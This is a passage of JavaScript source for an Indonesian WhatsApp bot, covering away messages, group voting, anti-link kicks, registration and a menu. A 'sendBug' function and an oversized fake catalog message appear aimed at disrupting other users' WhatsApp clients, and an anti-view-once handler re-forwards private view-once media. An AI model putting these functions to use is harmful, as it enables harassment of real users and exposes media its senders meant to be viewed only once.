sendEphemeral: false,
"externalAdReply": {
                "title": `Whatsapp-BOT\nBy. (@Callmee_alya) •Instagram photos and Videos`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://a.top4top.io/p_2073icief0.jpg",
                "thumbnail": fake,
                "sourceUrl": ``
},mentionedJid:[sender]}, quoted : mek})
};
//Awok
const katalog = (teks) => {
             res = itsmevall.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 499999999999999999, "message": teks, "footerText": "*ItsMevall*", "thumbnail": bgg, "surface": 'CATALOG' }}, {quoted:mek})
             itsmevall.relayWAMessage(res)
        }
const fakewa = (teks) => {
itsmevall.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `Whatsapp`,
                "body": `wa.me/62858157008612`,
                "mediaType": "10",
                "mediaUrl": `wa.me/62858157008612`,
                "thumbnailUrl": "https://j.top4top.io/p_20682m4yj0.jpg",
                "thumbnail": iye,
                "sourceUrl": `wa.me/62858157008612`,
},mentionedJid:[sender]}, quoted : mek})
};
const fakeyt = (teks) => {
itsmevall.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `hallo ${pushname}` ,
"body": `${ucapanWaktu}`,
"mediaType": "2",
"thumbnailUrl": "https://c.top4top.io/p_2087f30hj1.jpeg",
"mediaUrl": "https://youtu.be/uygjD8rqVLE",
"thumbnail": fs.readFileSync('./media/thumb.jpeg'),
"sourceUrl": "",
},mentionedJid:[sender]}, quoted : fgif})
};
// Support Di Versi 3.5.2 
    const sendBug = async (target, teks) => {
      if (!teks) teks = ".";
      await itsmevall.relayWAMessage(
        itsmevall.prepareMessageFromContent(
          target,
          itsmevall.prepareDisappearingMessageSettingContent(0),
          {}
        ),
        { waitForAck: true }
      );
      itsmevall.sendMessage(target, teks, "conversation");
    };

    //FUNCTION
    function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }

    cekafk(afk);
    if (!mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {     
        if (isAfk(mek.key.remoteJid)) return;
        addafk(mek.key.remoteJid);
        heheh = ms(Date.now() - waktu);
        itsmevall.sendMessage(
          mek.key.remoteJid,
          `@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
          MessageType.text,
          {
            contextInfo: {
              mentionedJid: [`${owner}@s.whatsapp.net`],
              stanzaId: "B826873620DD5947E683E3ABE663F263",
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                imageMessage: {
                  caption: "*OFFLINE*",
                  jpegThumbnail: fs.readFileSync("./media/thumb.jpeg"),
                },
              },
            },
          }
        );
      }
    }
    if (mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (mek.message.extendedTextMessage != undefined) {
          if (mek.message.extendedTextMessage.contextInfo != undefined) {
            if (
              mek.message.extendedTextMessage.contextInfo.mentionedJid !=
              undefined
            ) {
              for (let ment of mek.message.extendedTextMessage.contextInfo
                .mentionedJid) {
                if (ment === `${owner}@s.whatsapp.net`) {
                  if (isAfk(mek.key.remoteJid)) return;
                  addafk(mek.key.remoteJid);
                  heheh = ms(Date.now() - waktu);
                  itsmevall.sendMessage(
                    mek.key.remoteJid,
                    `@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
                    MessageType.text,
                    {
                      contextInfo: {
                        mentionedJid: [`${owner}@s.whatsapp.net`],
                        stanzaId: "B826873620DD5947E683E3ABE663F263",
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                          imageMessage: {
                            caption: "*OFFLINE*",
                            jpegThumbnail: fs.readFileSync("./media/thumb.jpeg"),
                          },
                        },
                      },
                    }
                  );
                }
              }
            }
          }
        }
      }
    }

    //========================================================================================================================//
    colors = ["red", "white", "black", "blue", "yellow", "green"];
    const isMedia = type === "imageMessage" || type === "videoMessage";
    const isQuotedImage =
      type === "extendedTextMessage" && content.includes("imageMessage");
    const isQuotedVideo =
      type === "extendedTextMessage" && content.includes("videoMessage");
    const isQuotedAudio =
      type === "extendedTextMessage" && content.includes("audioMessage");
    const isQuotedSticker =
      type === "extendedTextMessage" && content.includes("stickerMessage");

/*if (listbut) console.log("[",color("command","lime"),"]",time2,color(listbut,"lime"),"from",color(sender.split("@")[0],"cyan"))*/
//list command

async function sendFileFromUrl(from, url, caption, msg, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return itsmevall.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: mek, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
    if (!isGroup && prefix && command)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "args :",
        color(args.length)
      );
    //if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
    if (prefix && command && isGroup)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "in",
        color(groupName),
        "args :",
        color(args.length)
      );
    //if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
    if (isGroup && !isVote) {
      if (budy.toLowerCase() === "vote") {
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "6283833310095@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "✅",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      } else if (budy.toLowerCase() === "devote") {
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "62858157008612@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "❌",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      }
    }
    const sendKontak = (from, nomor, nama, org = "") => {
      const vcard =
        "BEGIN:VCARD\n" +
        "VERSION:3.0\n" +
        "FN:" +
        nama +
        "\n" +
        "ORG:" +
        org +
        "\n" +
        "TEL;type=CELL;type=VOICE;waid=" +
        nomor +
        ":+" +
        nomor +
        "\n" +
        "END:VCARD";
      itsmevall.sendMessage(
        from,
        { displayname: nama, vcard: vcard },
        MessageType.contact,
        { quoted: mek }
      );
    };
    //•======>> SUBSCRIBE : HY FAUZI <<====•\\
			if (bad.includes(messagesD)) {
kntl = `${args.join(' ')}`
nama = ("TOXIC DETECTED\nNIH PERGI KE ARAB")
impostor = ("BIAR GAK TOXIC")
itsmevall.sendMessage(from, { degreesLatitude: 21.422487, degreesLongitude: 39.826206,
name: nama,
address: impostor,
jpegThumbnail: fs.readFileSync('./media/thumb.jpeg')}, MessageType.liveLocation, {quoted:floc})
}
    //kasih wm gw ajg kalau make
    if (isGroup && isAntilink && !mek.key.fromMe) {
      if (budy.includes("://chat.whatsapp.com/")) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTILINK DETECTED!! MAAF ANDA AKAN DIKICK OLEH SAYA😎👍");
        itsmevall.groupRemove(from, [sender]);
      }
    }
if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3) {
if (bugc === false) return
if (mek.key.fromMe) return
nums = mek.participant
longkapnye = "\n".repeat(420)
tekuss = `${longkapnye}\`\`\`B U G  G C  T E R D E T E K S I\`\`\`\n@⁨${nums.split('@')[0]} akan dikick\n\n_Clear chat by bot_\n*Jangan maen bug lah*`
itsmevall.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply2(`Gua mau kick tapi gua bukan admin 🤙`) })
itsmevall.sendMessage(mek.key.remoteJid, 'WAH BUG NIH', MessageType.text)
itsmevall.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
}
    if (isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {
      reply(
        `@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`
      );
      var msg = { ...mek };
      msg.mek = mek.message.viewOnceMessage.message;
      msg.mek[Object.keys(msg.mek)[0]].viewOnce = false;
      itsmevall.copyNForward(m.chat, msg);
    }
    if (
      isGroup &&
      isAntihidetag &&
      m.message[m.mtype]?.contextInfo?.mentionedJid?.length ==
        groupMembers.length
    ) {
      console.log(
        color("[ANTI-HIDETAG]", "red"),
        color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "white")
      );
      reply(`@${sender.split("@")[0]} Terdeteksi mengirim pesan hidetag!!`);
      itsmevall.groupRemove(from, [sender]);
      }    
    if (isGroup && isAntivirtex && !mek.key.fromMe) {
      if (budy.length > 700) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTIVIRTEX DETECTED!! MAAF ANDA AKAN DIKICK OLEH SAYA😎👍");
        itsmevall.groupRemove(from, [sender]);
      }
    }
    if (isGroup && autojoin == true) {
      if (budy.includes("://chat.whatsapp.com/")) {
        console.log(
          color("[AUTO-JOIN]", "red"),
          color("YAHAHAHHAHAH", "white")
        );
        itsmevall.query({
          json: [
            "action",
            "invite",
            `${budy.replace("https://chat.whatsapp.com/", "")}`,
          ],
        });
      }
    }    
    if (isGroup && isKickarea && !mek.key.fromMe) {
      if (sender.includes("62")) {
        reply("GRUP ONLY +62!");
        itsmevall.groupRemove(from, [sender]);
      }
    }
    // Runtime Di Bio Bang \\
    let settingstatus = 0;
    if (new Date() * 1 - settingstatus > 1000) {
      let _uptime = process.uptime() * 1000;
      let uptime = clockString(_uptime);

await itsmevall.setStatus(`Aktif Selama ${uptime} | Mode Publik`).catch((_) => _);
      settingstatus = new Date() * 1;
    }
    if (!mek.key.fromMe && banChats === true) return;
switch (command) {
	case 'verify': 
	case 'daftar':
	let bio_nya = await itsmevall.getStatus(sender)
		try {
			bio_user = `${bio_nya.status}`
		} catch {
			bio_user = '-'
			}
			try {
        pp_userb = await client.getProfilePicture(mem);
      } catch (e) {
        pp_userb =
          "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
      }
      pp_userz = await getBuffer(pp_userb)
 if (isRegistered) return reply('Kamu sudah terdaftar di dalam database')
 addRegisteredUser(sender, pushname, bio_user) 
fs.writeFileSync('./database/user/registered.json', JSON.stringify(register))
teks = `╭─❒ *Verification*\n│ *Nama :* ${pushname}\n│ *Nomor :* @${sender.split('@')[0]}\n│ *Bio :* ${bio_user}\n╰❒ *Success*`
								sendButLocation(from, `${teks}`,`Terimakasih telah mendaftarkan diri ke dalam database bot`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}menu`,buttonText:{displayText:'MENU'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
break
case 'help':        
case 'menu':
menuc = fs.readFileSync('./menu.mp3')
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
let data = fs.readFileSync('./lib/kontol.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
hasil = await getBuffer(randKey.result)
janganti = '6289503657396'
kontol = '6289503657396'
itsmevall.sendMessage(from, menuc, audio, { quoted: mek, mimetype: 'audio/mp4', ptt:true })
totalChat = await itsmevall.chats.all()
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
thu = await itsmevall.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
menuh = `${ucapanWaktu} @${sender.split('@')[0]}\n\nSaya REALZIBOT, Bot WhatsApp yg membantu kamu untuk mempermudah sesuatu seperti Membuat Sticker dan Lainnya, Ada Butuh Info Dariku?`
itsmevall.sendMessage(from, { contentText: `${menuh}`, 
footerText: `Note: Kalo kamu pakai wa lama atau mod, dan button ga keliatan, langsung aja ketik ${prefix}allmenu, catatan patuhi rules bot atau kamu akan di blokir oleh bot
Dipersembahkan oleh : ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎